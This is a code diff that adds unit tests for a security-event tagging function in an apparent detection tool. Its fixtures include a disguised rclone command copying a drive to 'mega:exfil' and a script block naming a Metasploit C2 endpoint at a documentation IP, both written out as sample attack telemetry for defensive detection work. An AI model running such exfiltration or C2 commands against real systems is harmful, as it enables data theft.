@@ -114,3 +114,35 @@ describe("buildAttackPhaseDigest", () => {
     expect(buildAttackPhaseDigest([])).toBe("");
   });
 });
+
+describe("renderStructuredTags — destination facts and the renamed-binary flag (#1502)", () => {
+  it("appends the rclone destination and the decoy flag after the existing tags", () => {
+    const t = renderStructuredTags(
+      ev({
+        asset: "WS01",
+        processName: "rclone.exe",
+        parentName: "powershell.exe",
+        commandLine: '"C:\\T\\rclone.exe" /c echo X rclone.exe copy X:\\ mega:exfil --config rclone.conf',
+        description: "Sysmon EID 1 rclone.exe [renamed binary: rclone.exe is really Cmd.Exe]",
+      }),
+    );
+    expect(t).toContain("<proc:rclone.exe←powershell.exe>");
+    expect(t).toContain("<dest:mega:exfil>");
+    expect(t).toContain("<renamed-binary:rclone.exe is really Cmd.Exe — ");
+    expect(t.indexOf("<proc:")).toBeLessThan(t.indexOf("<dest:"));
+  });
+
+  it("puts a script block's endpoint on the row even though the description never held it", () => {
+    const t = renderStructuredTags(
+      ev({
+        description: "EID 4104 ScriptBlockText=function Invoke-Sim {",
+        message: "function Invoke-Sim { Invoke-LoopbackPort 4321 '203.0.113.22:4321 Metasploit C2' }",
+      }),
+    );
+    expect(t).toBe(" <mentions-endpoint:203.0.113.22:4321 (labelled c2)>");
+  });
+
+  it("adds nothing to a bare row", () => {
+    expect(renderStructuredTags(ev({ description: "Logon 4624" }))).toBe("");
+  });
+});
